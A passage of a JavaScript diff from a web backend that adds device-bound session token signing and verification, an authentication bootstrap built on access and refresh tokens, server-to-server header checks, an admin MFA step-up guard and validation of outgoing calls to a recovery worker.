+  return bound && bound.binding ? bound.binding : (diracCentralDeviceStableSessionBindingV222(req) || '');
+}
+
+function diracCentralDeviceTokenV221(req, sessionBindingOverride) {
+  const now = Date.now();
+  const sessionBinding = String(sessionBindingOverride || diracCentralDeviceSessionBindingV222(req) || '');
+  if (!sessionBinding) throw new Error('DIRAC_DEVICE_SESSION_BINDING_MISSING');
+  const payload = {
+    typ: DIRAC_CENTRAL_HARDENING_V221,
+    sbv: 2,
+    session: sessionBinding,
+    device: diracCentralDeviceFingerprintV221(req),
+    iat: now,
+    exp: now + 24 * 60 * 60 * 1000,
+    jti: crypto.randomBytes(18).toString('base64url')
+  };
+  const encoded = Buffer.from(JSON.stringify(payload)).toString('base64url');
+  const signature = crypto.createHmac('sha512', diracCentralDeriveSecretV146('central-device-v221')).update(encoded).digest('base64url');
+  return encoded + '.' + signature;
+}
+
+function diracCentralVerifyDeviceTokenV221(req, token) {
+  const parts = String(token || '').split('.');
+  if (parts.length !== 2 || !parts[0] || !parts[1]) return { ok: false, reason: 'device_credential_shape_invalid' };
+  const expected = crypto.createHmac('sha512', diracCentralDeriveSecretV146('central-device-v221')).update(parts[0]).digest('base64url');
+  if (!(typeof safeEqual === 'function' ? safeEqual(parts[1], expected) : parts[1] === expected)) return { ok: false, reason: 'device_credential_signature_invalid' };
+  let payload;
+  try { payload = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8')); } catch (_) { return { ok: false, reason: 'device_credential_payload_invalid' }; }
+  const now = Date.now();
+  const issuedAt = Number(payload && payload.iat || 0);
+  const expiresAt = Number(payload && payload.exp || 0);
+  if (!payload || payload.typ !== DIRAC_CENTRAL_HARDENING_V221
+      || !Number.isSafeInteger(issuedAt) || !Number.isSafeInteger(expiresAt)
+      || issuedAt > now + 60 * 1000 || expiresAt <= now
+      || expiresAt - issuedAt <= 0 || expiresAt - issuedAt > 24 * 60 * 60 * 1000 + 60 * 1000
+      || !/^[A-Za-z0-9_-]{16,160}$/.test(String(payload.jti || ''))) {
+    return { ok: false, reason: 'device_credential_expired' };
+  }
+  const device = diracCentralDeviceFingerprintV221(req);
+  if (!payload.device || !(typeof safeEqual === 'function' ? safeEqual(String(payload.device), device) : String(payload.device) === device)) {
+    return { ok: false, reason: 'device_credential_fingerprint_mismatch' };
+  }
+  if (!payload.session) return { ok: false, reason: 'device_credential_session_mismatch' };
+
+  if (payload.sbv !== undefined && Number(payload.sbv) !== 2) {
+    return { ok: false, reason: 'device_credential_binding_version_invalid' };
+  }
+
+  if (Number(payload.sbv || 0) === 2) {
+    const session = diracCentralDeviceSessionBindingV222(req);
+    if (!session || !(typeof safeEqual === 'function' ? safeEqual(String(payload.session), session) : String(payload.session) === session)) {
+      return { ok: false, reason: 'device_credential_session_mismatch' };
+    }
+    return { ok: true, payload };
+  }
+
+  const legacyHashes = diracCentralLegacyDeviceSessionHashesV222(req);
+  const legacyMatch = legacyHashes.some((hash) => typeof safeEqual === 'function'
+    ? safeEqual(String(payload.session), String(hash))
+    : String(payload.session) === String(hash));
+  if (legacyMatch) return { ok: true, payload, upgrade: true };
+
+  const stableSession = diracCentralDeviceStableSessionBindingV222(req);
+  if (!stableSession) return { ok: false, reason: 'device_credential_session_mismatch' };
+  return { ok: true, payload, upgrade: true, rotatedFromLegacySession: true };
+}
+
+
+const DIRAC_CENTRAL_DEVICE_AUTH_BOOTSTRAP_V224 = 'dirac-central-device-auth-bootstrap-v224';
+const DIRAC_CENTRAL_DEVICE_AUTH_CACHE_V224 = Symbol('dirac-central-device-auth-cache-v224');
+const DIRAC_CENTRAL_DEVICE_BOOTSTRAP_ACTIONS_V224 = Object.freeze(new Set([
+  'domain_me',
+  'domain_dashboard_me',
+  'domain_mfa_status',
+  'customer_security_overview',
+  'checkout_order',
+  'create_payment',
+  'my_orders',
+  'customer_security_recovery_codes_generate',
+  'customer_security_recovery_code_verify',
+  'dirac_mfa_passkey_start',
+  'dirac_mfa_passkey_verify',
+  'domain_mfa_passkey_start',
+  'domain_mfa_passkey_verify'
+]));
+
+function diracCentralDeviceAuthIdentityV224(user) {
+  const row = user && typeof user === 'object' ? user : {};
+  const userId = String(row.id || row.user_id || row.sub || '').trim();
+  const email = normalizeAuthEmail(row.email || '');
+  if (!userId || !email) return null;
+  return Object.freeze({ userId, email });
+}
+
+function diracCentralDeviceSignedSessionStateV224(cookies, identity) {
+  const values = typeof readCookieTokenCandidates === 'function'
+    ? readCookieTokenCandidates(cookies || {}, DOMAIN_SIGNED_SESSION_COOKIE).slice(0, 8)
+    : [cookies && cookies[DOMAIN_SIGNED_SESSION_COOKIE]].filter(Boolean);
+  const valid = values.map((value) => verifyDomainSessionCookieValue(value)).filter(Boolean);
+  const matching = valid.filter((item) => String(item.id || '') === identity.userId
+    && normalizeAuthEmail(item.email || '') === identity.email);
+  const mismatching = valid.filter((item) => String(item.id || '') !== identity.userId
+    || normalizeAuthEmail(item.email || '') !== identity.email);
+  return Object.freeze({
+    validCount: valid.length,
+    matchingCount: matching.length,
+    mismatchingCount: mismatching.length,
+    hasMatching: matching.length > 0,
+    hasMismatch: mismatching.length > 0
+  });
+}
+
+async function diracCentralAuthenticateDeviceBootstrapV224(req) {
+  const cookies = typeof parseCookies === 'function' ? parseCookies(req) : {};
+  const acceptFrontendAuthHeaders = typeof shouldAcceptFrontendAuthHeaders === 'function'
+    ? shouldAcceptFrontendAuthHeaders()
+    : false;
+  const headerToken = acceptFrontendAuthHeaders && typeof getBearerToken === 'function' ? getBearerToken(req) : '';
+  const accessCookieTokens = typeof readCookieTokenCandidates === 'function'
+    ? readCookieTokenCandidates(cookies, ACCESS_COOKIE)
+    : [cookies && cookies[ACCESS_COOKIE]].filter(Boolean);
+  const accessTokens = typeof uniqueNonEmptyStrings === 'function'
+    ? uniqueNonEmptyStrings([headerToken, ...accessCookieTokens]).slice(0, 12)
+    : [headerToken, ...accessCookieTokens].filter(Boolean).slice(0, 12);
+
+  for (const accessToken of accessTokens) {
+    const result = await supabaseFetch('/auth/v1/user', {
+      method: 'GET',
+      auth: 'anon',
+      bearer: accessToken
+    }).catch(() => null);
+    const identity = result && result.ok && result.data ? diracCentralDeviceAuthIdentityV224(result.data) : null;
+    const jwtIdentity = identity ? diracCentralDeviceJwtUserV223(accessToken) : null;
+    if (identity && jwtIdentity
+        && (jwtIdentity.userId !== identity.userId || jwtIdentity.email !== identity.email)) continue;
+    if (identity) {
+      return Object.freeze({
+        ok: true,
+        source: 'verified_access_token',
+        user: result.data,
+        identity,
+        accessToken,
+        session: null,
+        refreshed: false,
+        cookies
+      });
+    }
+  }
+
+  const headerRefreshToken = acceptFrontendAuthHeaders
+    ? String(req && req.headers && (req.headers['x-domain-refresh'] || req.headers['x-refresh-token']) || '').trim()
+    : '';
+  const refreshCookieTokens = typeof readCookieTokenCandidates === 'function'
+    ? readCookieTokenCandidates(cookies, REFRESH_COOKIE)
+    : [cookies && cookies[REFRESH_COOKIE]].filter(Boolean);
+  const refreshTokens = typeof uniqueNonEmptyStrings === 'function'
+    ? uniqueNonEmptyStrings([headerRefreshToken, ...refreshCookieTokens]).slice(0, 12)
+    : [headerRefreshToken, ...refreshCookieTokens].filter(Boolean).slice(0, 12);
+
+  for (const refreshToken of refreshTokens) {
+    const result = await supabaseFetch('/auth/v1/token?grant_type=refresh_token', {
+      method: 'POST',
+      auth: 'anon',
+      body: { refresh_token: refreshToken }
+    }).catch(() => null);
+    if (!result || !result.ok || !result.data || !result.data.access_token) continue;
+    const session = Object.assign({}, result.data, {
+      refresh_token: result.data.refresh_token || refreshToken
+    });
+    if (!hasValidDomainSessionTokens(session)) continue;
+    let user = session.user || result.data.user;
+    let identity = diracCentralDeviceAuthIdentityV224(user);
+    if (!identity) {
+      const userResult = await supabaseFetch('/auth/v1/user', {
+        method: 'GET',
+        auth: 'anon',
+        bearer: session.access_token
+      }).catch(() => null);
+      user = userResult && userResult.ok ? userResult.data : null;
+      identity = diracCentralDeviceAuthIdentityV224(user);
+    }
+    if (!identity) continue;
+    const jwtIdentity = diracCentralDeviceJwtUserV223(session.access_token);
+    if (jwtIdentity && (jwtIdentity.userId !== identity.userId || jwtIdentity.email !== identity.email)) continue;
+    return Object.freeze({
+      ok: true,
+      source: 'verified_refresh_token',
+      user,
+      identity,
+      accessToken: session.access_token,
+      session: Object.assign({}, session, { user }),
+      refreshed: true,
+      cookies
+    });
+  }
+
+  const signedUser = typeof readSignedDomainSessionUser === 'function'
+    ? await readSignedDomainSessionUser(cookies).catch(() => null)
+    : null;
+  const signedIdentity = diracCentralDeviceAuthIdentityV224(signedUser);
+  if (signedIdentity) {
+    return Object.freeze({
+      ok: true,
+      source: 'verified_signed_session',
+      user: signedUser,
+      identity: signedIdentity,
+      accessToken: '',
+      session: null,
+      refreshed: false,
+      cookies
+    });
+  }
+
+  return Object.freeze({ ok: false, reason: 'device_bootstrap_authentication_failed' });
+}
+
+function diracCentralPublishVerifiedAuthSessionV224(res, authentication, maxAge) {
+  if (!authentication || !authentication.ok) return { ok: false, reason: 'device_bootstrap_authentication_missing' };
+  if (authentication.refreshed) {
+    const session = authentication.session;
+    if (!hasValidDomainSessionTokens(session)) return { ok: false, reason: 'device_bootstrap_refresh_session_invalid' };
+    appendSetCookie(res, [
+      ...makeTokenCookieSet(ACCESS_COOKIE, session.access_token, { maxAge }),
+      ...makeTokenCookieSet(REFRESH_COOKIE, session.refresh_token, { maxAge }),
+      ...makeSignedDomainSessionCookieSet(session, { maxAge })
+    ]);
+    if (!shouldHideDomainAuthTokens()) {
+      res.setHeader('X-Domain-Access-Token', session.access_token);
+      res.setHeader('X-Domain-Refresh-Token', session.refresh_token);
+    }
+    res.setHeader('X-Domain-Token-Refreshed', 'true');
+    return { ok: true, signedSessionIssued: true };
+  }
+
+  const signedState = diracCentralDeviceSignedSessionStateV224(authentication.cookies, authentication.identity);
+  if (signedState.hasMismatch) return { ok: false, reason: 'device_bootstrap_signed_session_mismatch' };
+  if (signedState.hasMatching) {
+    if (authentication.source === 'verified_signed_session') res.setHeader('X-Domain-Signed-Session', 'true');
+    return { ok: true, signedSessionIssued: false };
+  }
+  if (!authentication.accessToken) return { ok: false, reason: 'device_bootstrap_signed_session_missing' };
+  const signedCookies = makeSignedDomainSessionCookieSet({
+    access_token: authentication.accessToken,
+    user: authentication.user
+  }, { maxAge });
+  if (!Array.isArray(signedCookies) || !signedCookies.length) {
+    return { ok: false, reason: 'device_bootstrap_signed_session_issue_failed' };
+  }
+  appendSetCookie(res, signedCookies);
+  return { ok: true, signedSessionIssued: true };
+}
+
+function diracCentralSealVerifiedDeviceAuthV224(req, ctx, authentication, binding) {
+  const identity = authentication && authentication.identity;
+  const user = authentication && authentication.user;
+  if (!req || !identity || !user || !binding) return false;
+  const requestId = String(ctx && ctx.requestId || '');
+  const sealed = Object.freeze({
+    patch: DIRAC_CENTRAL_DEVICE_AUTH_BOOTSTRAP_V224,
+    requestId,
+    createdAtMs: Date.now(),
+    binding: String(binding),
+    source: String(authentication.source || ''),
+    identity,
+    user: Object.freeze(Object.assign({}, user))
+  });
+  try {
+    Object.defineProperty(req, DIRAC_CENTRAL_DEVICE_AUTH_CACHE_V224, {
+      value: sealed,
+      writable: false,
+      enumerable: false,
+      configurable: false
+    });
+  } catch (_) {
+    return false;
+  }
+  if (ctx && typeof ctx === 'object') {
+    ctx.authentication = Object.freeze({
+      verified: true,
+      source: sealed.source,
+      userId: identity.userId,
+      email: identity.email,
+      bootstrap: DIRAC_CENTRAL_DEVICE_AUTH_BOOTSTRAP_V224
+    });
+  }
+  return true;
+}
+
+function diracCentralReadVerifiedDeviceAuthV224(req) {
+  const sealed = req && req[DIRAC_CENTRAL_DEVICE_AUTH_CACHE_V224];
+  if (!sealed || sealed.patch !== DIRAC_CENTRAL_DEVICE_AUTH_BOOTSTRAP_V224) return null;
+  const ctx = typeof diracCentralCurrentContextV149 === 'function' ? diracCentralCurrentContextV149() : null;
+  if (!ctx || String(sealed.requestId || '') !== String(ctx.requestId || '')) return null;
+  if (!Number.isSafeInteger(Number(sealed.createdAtMs)) || Date.now() - Number(sealed.createdAtMs) > 60 * 1000) return null;
+  const identity = diracCentralDeviceAuthIdentityV224(sealed.user);
+  if (!identity || identity.userId !== sealed.identity.userId || identity.email !== sealed.identity.email) return null;
+  return sealed.user;
+}
+
+function diracCentralReadVerifiedDeviceBindingV227(req) {
+  const sealed = req && req[DIRAC_CENTRAL_DEVICE_AUTH_CACHE_V224];
+  if (!sealed || sealed.patch !== DIRAC_CENTRAL_DEVICE_AUTH_BOOTSTRAP_V224) return '';
+
+  const ctx = typeof diracCentralCurrentContextV149 === 'function'
+    ? diracCentralCurrentContextV149()
+    : null;
+  if (!ctx || ctx.req !== req || String(sealed.requestId || '') !== String(ctx.requestId || '')) return '';
+
+  const now = Date.now();
+  const createdAtMs = Number(sealed.createdAtMs);
+  if (!Number.isSafeInteger(createdAtMs)
+      || createdAtMs > now + 1000
+      || now - createdAtMs > 60 * 1000) return '';
+
+  const identity = diracCentralDeviceAuthIdentityV224(sealed.user);
+  const sealedIdentity = sealed.identity && typeof sealed.identity === 'object' ? sealed.identity : null;
+  const contextAuthentication = ctx.authentication && typeof ctx.authentication === 'object'
+    ? ctx.authentication
+    : null;
+  if (!identity || !sealedIdentity || !contextAuthentication
+      || contextAuthentication.verified !== true
+      || contextAuthentication.bootstrap !== DIRAC_CENTRAL_DEVICE_AUTH_BOOTSTRAP_V224
+      || identity.userId !== String(sealedIdentity.userId || '')
+      || identity.email !== normalizeAuthEmail(sealedIdentity.email || '')
+      || identity.userId !== String(contextAuthentication.userId || '')
+      || identity.email !== normalizeAuthEmail(contextAuthentication.email || '')) return '';
+
+  const binding = String(sealed.binding || '').trim();
+  return /^[a-f0-9]{64}$/.test(binding) ? binding : '';
+}
+
+function diracCentralVerifyDeviceEnvelopeV224(req, token) {
+  const parts = String(token || '').split('.');
+  if (parts.length !== 2 || !parts[0] || !parts[1]) return { ok: false, reason: 'device_credential_shape_invalid' };
+  const expected = crypto.createHmac('sha512', diracCentralDeriveSecretV146('central-device-v221')).update(parts[0]).digest('base64url');
+  if (!(typeof safeEqual === 'function' ? safeEqual(parts[1], expected) : parts[1] === expected)) {
+    return { ok: false, reason: 'device_credential_signature_invalid' };
+  }
+  let payload;
+  try { payload = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8')); }
+  catch (_) { return { ok: false, reason: 'device_credential_payload_invalid' }; }
+  const now = Date.now();
+  const issuedAt = Number(payload && payload.iat || 0);
+  const expiresAt = Number(payload && payload.exp || 0);
+  if (!payload || payload.typ !== DIRAC_CENTRAL_HARDENING_V221
+      || !Number.isSafeInteger(issuedAt) || !Number.isSafeInteger(expiresAt)
+      || issuedAt > now + 60 * 1000 || expiresAt <= now
+      || expiresAt - issuedAt <= 0 || expiresAt - issuedAt > 24 * 60 * 60 * 1000 + 60 * 1000
+      || !/^[A-Za-z0-9_-]{16,160}$/.test(String(payload.jti || ''))
+      || (payload.sbv !== undefined && Number(payload.sbv) !== 2)) {
+    return { ok: false, reason: 'device_credential_expired' };
+  }
+  const device = diracCentralDeviceFingerprintV221(req);
+  if (!payload.device || !(typeof safeEqual === 'function' ? safeEqual(String(payload.device), device) : String(payload.device) === device)) {
+    return { ok: false, reason: 'device_credential_fingerprint_mismatch' };
+  }
+  return { ok: true, payload };
+}
+
+async function diracCentralStrictBootstrapDeviceSessionV224(req, res, ctx) {
+  if (!DIRAC_CENTRAL_DEVICE_BOOTSTRAP_ACTIONS_V224.has(String(ctx && ctx.action || ''))) {
+    return { ok: false, reason: 'device_credential_session_missing' };
+  }
+  const authentication = await diracCentralAuthenticateDeviceBootstrapV224(req);
+  if (!authentication.ok) return authentication;
+
+  const signedState = diracCentralDeviceSignedSessionStateV224(authentication.cookies, authentication.identity);
+  if (signedState.hasMismatch) return { ok: false, reason: 'device_bootstrap_signed_session_mismatch' };
+
+  const maxAge = typeof diracV110SessionMaxAgeSeconds === 'function'
+    ? diracV110SessionMaxAgeSeconds()
+    : 60 * 60 * 24 * 7;
+  const published = diracCentralPublishVerifiedAuthSessionV224(res, authentication, maxAge);
+  if (!published.ok) return published;
+
+  const created = diracCentralCreateDeviceSessionCookieV223(authentication.identity, maxAge);
+  if (!created) return { ok: false, reason: 'device_bootstrap_session_cookie_issue_failed' };
+  appendSetCookie(res, created.cookie);
+  if (!diracCentralSealVerifiedDeviceAuthV224(req, ctx, authentication, created.binding)) {
+    return { ok: false, reason: 'device_bootstrap_auth_cache_seal_failed' };
+  }
+  return {
+    ok: true,
+    binding: created.binding,
+    authentication,
+    source: authentication.source,
+    refreshed: authentication.refreshed === true,
+    signedSessionIssued: published.signedSessionIssued === true
+  };
+}
+
+async function diracCentralDeviceCredentialGuardV221(req, res, ctx) {
+  const action = String(ctx && ctx.action || '');
+  const deviceCredentialRequired = DIRAC_CENTRAL_USER_DATA_ACTIONS_V146.has(action)
+    || /^domain_dashboard|^customer_security|^admin_security/.test(action)
+    || DIRAC_CENTRAL_DEVICE_BOOTSTRAP_ACTIONS_V224.has(action);
+  if (!deviceCredentialRequired) return { ok: true };
+  const boundSessionCookie = diracCentralVerifyDeviceSessionCookieV223(req);
+  let session = boundSessionCookie && boundSessionCookie.binding ? String(boundSessionCookie.binding) : '';
+  let bootstrapped = null;
+  if (!session && DIRAC_CENTRAL_DEVICE_BOOTSTRAP_ACTIONS_V224.has(String(ctx && ctx.action || ''))) {
+    bootstrapped = await diracCentralStrictBootstrapDeviceSessionV224(req, res, ctx);
+    if (!bootstrapped || !bootstrapped.ok) {
+      return { ok: false, reason: bootstrapped && bootstrapped.reason || 'device_credential_session_missing' };
+    }
+    session = String(bootstrapped.binding || '');
+  }
+  if (!session) session = diracCentralDeviceStableSessionBindingV222(req);
+  if (!session) return { ok: false, reason: 'device_credential_session_missing' };
+
+  const cookies = typeof parseCookies === 'function' ? parseCookies(req) : {};
+  const name = diracCentralDeviceCookieNameV221();
+  const token = String(cookies && cookies[name] || '').trim();
+  if (!token) {
+    try {
+      const issued = diracCentralDeviceTokenV221(req, session);
+      appendSetCookie(res, makeCookie(name, issued, { maxAge: 24 * 60 * 60, domain: '' }));
+      return { ok: true, issued: true, bootstrapped: Boolean(bootstrapped) };
+    } catch (_) {
+      return { ok: false, reason: 'device_credential_issue_failed' };
+    }
+  }
+
+  const verified = diracCentralVerifyDeviceTokenV221(req, token);
+  if (verified.ok) {
+    if (!verified.upgrade) return verified;
+    try {
+      const upgraded = diracCentralDeviceTokenV221(req, session);
+      appendSetCookie(res, makeCookie(name, upgraded, { maxAge: 24 * 60 * 60, domain: '' }));
+      return { ok: true, upgraded: true };
+    } catch (_) {
+      return { ok: false, reason: 'device_credential_upgrade_failed' };
+    }
+  }
+
+  if (bootstrapped && verified.reason === 'device_credential_session_mismatch') {
+    const envelope = diracCentralVerifyDeviceEnvelopeV224(req, token);
+    if (!envelope.ok) return envelope;
+    try {
+      const rotated = diracCentralDeviceTokenV221(req, session);
+      appendSetCookie(res, makeCookie(name, rotated, { maxAge: 24 * 60 * 60, domain: '' }));
+      return {
+        ok: true,
+        rotated: true,
+        bootstrapped: true,
+        decision: 'verified_auth_bootstrap_device_rotation'
+      };
+    } catch (_) {
+      return { ok: false, reason: 'device_credential_rotation_failed' };
+    }
+  }
+
+  return verified;
+}
+
+try {
+  const __diracV223OriginalSetSessionCookies = typeof setSessionCookies === 'function' ? setSessionCookies : null;
+  if (__diracV223OriginalSetSessionCookies && !__diracV223OriginalSetSessionCookies.__diracV223Wrapped) {
+    setSessionCookies = function setSessionCookiesV223(res, session) {
+      const ok = __diracV223OriginalSetSessionCookies(res, session);
+      if (!ok) return false;
+      const identity = typeof extractUserForSignedDomainSession === 'function' ? extractUserForSignedDomainSession(session) : null;
+      const maxAge = typeof diracV110SessionMaxAgeSeconds === 'function' ? diracV110SessionMaxAgeSeconds() : 60 * 60 * 24 * 7;
+      const created = diracCentralCreateDeviceSessionCookieV223(identity, maxAge);
+      if (!created) {
+        clearSessionCookies(res);
+        return false;
+      }
+      appendSetCookie(res, [
+        created.cookie,
+        makeCookie(diracCentralDeviceCookieNameV221(), '', { maxAge: 0, domain: '' })
+      ]);
+      return true;
+    };
+    Object.defineProperty(setSessionCookies, '__diracV223Wrapped', { value: true, enumerable: false });
+  }
+} catch (errorV223) { diracCentralRecordSuppressedExceptionV221(errorV223); }
+
+try {
+  const __diracV223OriginalClearSessionCookies = typeof clearSessionCookies === 'function' ? clearSessionCookies : null;
+  if (__diracV223OriginalClearSessionCookies && !__diracV223OriginalClearSessionCookies.__diracV223Wrapped) {
+    clearSessionCookies = function clearSessionCookiesV223(res) {
+      __diracV223OriginalClearSessionCookies(res);
+      appendSetCookie(res, [
+        makeCookie(diracCentralDeviceSessionCookieNameV223(), '', { maxAge: 0, domain: '' }),
+        makeCookie(diracCentralDeviceCookieNameV221(), '', { maxAge: 0, domain: '' })
+      ]);
+    };
+    Object.defineProperty(clearSessionCookies, '__diracV223Wrapped', { value: true, enumerable: false });
+  }
+} catch (errorV223) { diracCentralRecordSuppressedExceptionV221(errorV223); }
+
+
+try {
+  const __diracV224OriginalRequireDomainUser = typeof requireDomainUser === 'function' ? requireDomainUser : null;
+  if (__diracV224OriginalRequireDomainUser && !__diracV224OriginalRequireDomainUser.__diracV224Wrapped) {
+    requireDomainUser = async function requireDomainUserV224VerifiedBootstrapCache(req, res) {
+      const cached = diracCentralReadVerifiedDeviceAuthV224(req);
+      if (cached) return cached;
+      return __diracV224OriginalRequireDomainUser(req, res);
+    };
+    Object.defineProperty(requireDomainUser, '__diracV224Wrapped', { value: true, enumerable: false });
+  }
+} catch (errorV224) { diracCentralRecordSuppressedExceptionV221(errorV224); }
+
+function diracCentralS2SEnvelopeGuardV221(req, ctx) {
+  if (!diracS2SIsInternalActionV206(ctx)) return { ok: true };
+  const required = {
+    server: diracS2SHeaderV206(req, 'x-dirac-server-id'),
+    target: diracS2SHeaderV206(req, 'x-dirac-target-server-id'),
+    version: diracS2SHeaderV206(req, 'x-dirac-s2s-version'),
+    policy: diracS2SHeaderV206(req, 'x-dirac-s2s-policy'),
+    keyVersion: diracS2SHeaderV206(req, 'x-dirac-key-version'),
+    timestamp: diracS2SHeaderV206(req, 'x-dirac-timestamp'),
+    nonce: diracS2SHeaderV206(req, 'x-dirac-nonce'),
+    requestId: diracS2SHeaderV206(req, 'x-dirac-request-id'),
+    bodyHash: diracS2SHeaderV206(req, 'x-dirac-body-sha512')
+  };
+  if (!diracS2SIdV206(required.server) || !diracS2SIdV206(required.target) || !diracS2SKeyVersionV206(required.keyVersion)) return { ok: false, reason: 's2s_v221_identity_shape_invalid' };
+  if (required.version !== DIRAC_S2S_VERSION_V206 || required.policy !== DIRAC_S2S_POLICY_V206) return { ok: false, reason: 's2s_v221_version_policy_invalid' };
+  if (!/^\d{13}$/.test(required.timestamp) || Math.abs(Date.now() - Number(required.timestamp)) > Math.min(Number(DIRAC_S2S_MAX_CLOCK_SKEW_MS_V206 || 60000), 60000)) {
+    return { ok: false, reason: 's2s_v221_timestamp_invalid' };
+  }
+  if (!/^[A-Za-z0-9_-]{32,160}$/.test(required.nonce) || !/^[A-Za-z0-9_-]{24,160}$/.test(required.requestId) || !/^[a-f0-9]{128}$/i.test(required.bodyHash)) {
+    return { ok: false, reason: 's2s_v221_request_binding_invalid' };
+  }
+  const headers = req && req.headers || {};
+  if (headers['x-dirac-alg'] || headers['x-dirac-jku'] || headers['x-dirac-x5u']) return { ok: false, reason: 's2s_v221_algorithm_override_rejected' };
+  return { ok: true };
+}
+
+function diracCentralAdminStepUpGuardV221(req, ctx) {
+  if (ctx.classification !== 'admin' || !['POST', 'PUT', 'PATCH', 'DELETE'].includes(ctx.method)) return { ok: true };
+  const mfa = diracCentralMfaEnvelopeV221(req, ctx);
+  if (!mfa.ok) return { ok: false, reason: mfa.reason || 'admin_step_up_mfa_invalid' };
+  if (Date.now() - Number(mfa.payload.activeAtMs || 0) > 10 * 60 * 1000) return { ok: false, reason: 'admin_step_up_too_old' };
+  return { ok: true };
+}
+
+function diracCentralOwnershipPostconditionV221(ctx) {
+  if (!ctx || !ctx.policy || ctx.policy.ownership !== true) return { ok: true };
+  if (ctx.classification === 'server' || ctx.classification === 'public_read') return { ok: true };
+  if (diracCentralVerifiedOwnerActionV217(ctx.action)) {
+    const owner = diracCentralOwnerFromStage26V217(ctx);
+    if (!owner || owner.ok !== true || !diracCentralLooksLikeUuidV146(owner.authUserId)
+        || !Array.isArray(owner.customerIds) || owner.customerIds.length !== 1
+        || !diracCentralLooksLikeUuidV146(owner.customerIds[0])) {
+      return { ok: false, reason: 'v221_verified_owner_postcondition_failed' };
+    }
+  }
+  return { ok: true };
+}
+
+function diracCentralGuardBudgetMsV221(ctx) {
+  return ctx && ctx.classification === 'server' ? 60 * 1000 : 30 * 1000;
+}
+
+const DIRAC_RECOVERY_GENERATE_EGRESS_TIMEOUT_PATCH_V225 = 'dirac-recovery-generate-egress-timeout-v225';
+
+function diracCentralEgressHeaderV225(options, name) {
+  const headers = options && options.headers;
+  const expected = String(name || '').toLowerCase();
+  if (!headers || !expected) return '';
+  if (typeof headers.get === 'function') return String(headers.get(expected) || '').trim();
+  for (const [key, value] of Object.entries(headers)) {
+    if (String(key || '').toLowerCase() === expected) {
+      return String(Array.isArray(value) ? value[0] || '' : value || '').trim();
+    }
+  }
+  return '';
+}
+
+function diracCentralRecoveryGenerateEgressTimeoutMsV225(input, options) {
+  let s2sMessage = null;
+  try {
+    const ctx = diracCentralCurrentContextV149();
+    let expectedWorkerAction = '';
+    if (ctx && ctx.action === 'customer_security_recovery_codes_generate') {
+      expectedWorkerAction = DIRAC_RECOVERY_WORKER_TASK_GENERATE;
+    } else if (ctx && ctx.action === 'customer_security_recovery_code_verify') {
+      expectedWorkerAction = DIRAC_RECOVERY_WORKER_TASK_VERIFY;
+    }
+    if (!ctx
+        || !diracCentralHandlerContextFullyPassedV211(ctx, ctx.req)
+        || !expectedWorkerAction
+        || ctx.method !== 'POST'
+        || !ctx.ownership
+        || ctx.ownership.verified !== true
+        || ctx.ownership.action !== ctx.action) return 0;
+
+    const target = new URL(typeof input === 'string' ? input : input && input.url || '');
+    const queryEntries = Array.from(target.searchParams.entries());
+    if (target.protocol !== 'https:'
+        || target.hostname !== 'secure.diracgroup.store'
+        || (target.port && target.port !== '443')
+        || target.pathname !== '/api/health'
+        || target.username
+        || target.password
+        || target.hash
+        || queryEntries.length !== 1
+        || queryEntries[0][0] !== 'action'
+        || queryEntries[0][1] !== DIRAC_RECOVERY_WORKER_ACTION
+        || String(options && options.method || 'GET').toUpperCase() !== 'POST'
+        || String(options && options.redirect || '') !== 'error') return 0;
+
+    const bodyText = typeof (options && options.body) === 'string' ? options.body : '';
+    if (!bodyText
+        || Buffer.byteLength(bodyText, 'utf8') > customerSecurityRecoveryWorkerMaxBodyBytes()) return 0;
+    const envelope = JSON.parse(bodyText);
+    const expectedEnvelopeKeys = [
+      'action', 'aead_nonce_b64url', 'auth_tag_b64url', 'caller_id', 'ciphertext_b64url',
+      'expires_at_ms', 'hkdf_salt_b64url', 'mlkem_ciphertext_b64url', 'nonce',
+      'receiver_key_fingerprint', 'sent_at_ms', 'transport_suite', 'transport_version',
+      'worker_action', 'x25519_ephemeral_public_key_b64url'
+    ];
+    const envelopeKeys = Object.keys(envelope || {}).sort();
+    if (!envelope
+        || typeof envelope !== 'object'
+        || Array.isArray(envelope)
+        || envelopeKeys.length !== expectedEnvelopeKeys.length
+        || envelopeKeys.some((key, index) => key !== expectedEnvelopeKeys[index])
+        || envelope.action !== DIRAC_RECOVERY_WORKER_ACTION
+        || envelope.worker_action !== expectedWorkerAction
+        || envelope.transport_version !== DIRAC_RECOVERY_WORKER_TRANSPORT_VERSION_V190
+        || envelope.transport_suite !== DIRAC_RECOVERY_WORKER_TRANSPORT_SUITE_V190) return 0;
+
+    const caller = diracCentralEgressHeaderV225(options, 'x-dirac-worker-caller');
+    const workerTimestampText = diracCentralEgressHeaderV225(options, 'x-dirac-worker-timestamp');
+    const workerTimestamp = Number(workerTimestampText);
+    const workerSignature = diracCentralEgressHeaderV225(options, 'x-dirac-worker-signature');
+    if (!customerSecurityRecoveryWorkerAsciiToken(caller)
+        || caller !== customerSecurityRecoveryWorkerCaller()
+        || envelope.caller_id !== caller
+        || !Number.isSafeInteger(workerTimestamp)
+        || Math.abs(Date.now() - workerTimestamp) > customerSecurityRecoveryWorkerClockSkewMs()
+        || Number(envelope.sent_at_ms) !== workerTimestamp
+        || Number(envelope.expires_at_ms) !== workerTimestamp + DIRAC_RECOVERY_WORKER_TRANSPORT_TTL_MS_V190
+        || !/^[A-Za-z0-9_-]{43}$/.test(String(envelope.nonce || ''))
+        || !/^[A-Za-z0-9_-]{32,120}$/.test(workerSignature)) return 0;
+
+    const expectedWorkerSignature = customerSecurityRecoveryWorkerSign(
+      caller,
+      workerTimestampText,
+      customerSecurityLostPasskeyCanonical(envelope)
+    );
+    if (!safeEqual(workerSignature, expectedWorkerSignature)) return 0;
+
+    const s2sVersion = diracCentralEgressHeaderV225(options, 'x-dirac-s2s-version');
+    const s2sPolicy = diracCentralEgressHeaderV225(options, 'x-dirac-s2s-policy');
+    const networkId = diracCentralEgressHeaderV225(options, 'x-dirac-network-id');
+    const serverId = diracCentralEgressHeaderV225(options, 'x-dirac-server-id');
+    const targetServerId = diracCentralEgressHeaderV225(options, 'x-dirac-target-server-id');
+    const keyVersion = diracCentralEgressHeaderV225(options, 'x-dirac-key-version');
+    const s2sTimestampText = diracCentralEgressHeaderV225(options, 'x-dirac-timestamp');
+    const s2sTimestamp = Number(s2sTimestampText);
